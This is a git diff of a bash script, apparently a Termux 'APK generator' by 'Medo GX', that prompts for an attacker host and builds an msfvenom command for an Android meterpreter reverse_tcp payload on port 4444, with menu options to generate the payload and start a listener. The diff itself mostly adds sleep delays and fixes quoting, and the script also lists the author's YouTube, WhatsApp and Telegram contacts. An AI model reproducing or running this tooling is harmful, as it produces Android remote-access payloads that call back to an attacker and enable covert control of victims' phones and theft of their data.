@@ -10,17 +10,25 @@ green='\033[1;32m'
 you="https://www.youtube.com/@linux_whith_mohamed"
 wa="https://wa.me/+201280501875"
 te="https://t.me/MohamedvGX"
-
+sleep 0.2s
 echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
+sleep 0.2s
 echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
+sleep 0.2s
 echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
-
+sleep 0.2s
 echo -e "  $red Developer : $green MEDO $red GX "
+sleep 0.2s
 echo ''
+sleep 0.2s
 echo -e " $red Youtube : $green $you "
+sleep 0.2s
 echo " "
+sleep 0.2s
 echo -e "  $green whatsapp : $red $wa "
+sleep 0.2s
 echo ''
+sleep 0.2s
 echo -e "     $green Telegram : $red $te "
 sleep 3
 clear
@@ -75,32 +83,50 @@ fi
 sleep 2s
 clear
 echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
+sleep 0.2s
 echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
+sleep 0.2s
 echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
+sleep 0.2s
 echo -e "      $red developer : $green Medo GX "
+sleep 0.2s
 echo -e "     $red script $green v1 "
+sleep 0.2s
 echo ''
 echo ''
+sleep 0.2s
 read -p 'please Enter your host : ' ip 
 echo ""
+sleep 0.2s
 read -p 'please Enter payload name : ' path 
 msf="msfvenom -p android/meterpreter/reverse_tcp Lhost=$ip Lport=4444 -o $path"
 sleep 3s 
 clear
+sleep 0.2s
 echo -e $green "╔═╗┌─┐┬┌─  ┌─┐┌─┐┌┐┌┌─┐┬─┐┌─┐┌┬┐┌─┐┬─┐  "
+sleep 0.2s
 echo -e $red   "╠═╣├─┘├┴┐  │ ┬├┤ │││├┤ ├┬┘├─┤ │ │ │├┬┘  "
+sleep 0.2s
 echo -e $green "╩ ╩┴  ┴ ┴  └─┘└─┘┘└┘└─┘┴└─┴ ┴ ┴ └─┘┴└─  "
+sleep 0.2s
 echo -e "      $red developer : $green Medo GX "
+sleep 0.2s
 echo -e "     $red script $green v1 "
 echo ''
 echo ''
-
+sleep 0.2s
 echo '[1] generate payload '
+sleep 0.2s
 echo ''
+sleep 0.2s
 echo '[2] start listener '
+sleep 0.2s
 echo ''
+sleep 0.2s
 echo '[3] youtube '
+sleep 0.2s
 echo ''
+sleep 0.2s
 read -p 'choice : ' ch
 if [ $ch == 1 ]; then 
     sleep 1s
@@ -118,9 +144,11 @@ elif [ $ch == 3 ]; then
     termux-open-url https://www.youtube.com/@linux_whith_mohamed
 
 else 
-    echo -e '$red Error : please choose an number from list {1,2,3}'
-    echo ''
-    echo -e '$red restarting ....'
+    echo -e "$red Error : please choose an number from list {1,2,3}"
+    sleep 3s
+    clear 
+    echo -e "$red restarting ...."
+    sleep 2s
     bash hack-gx.sh
     
 fi
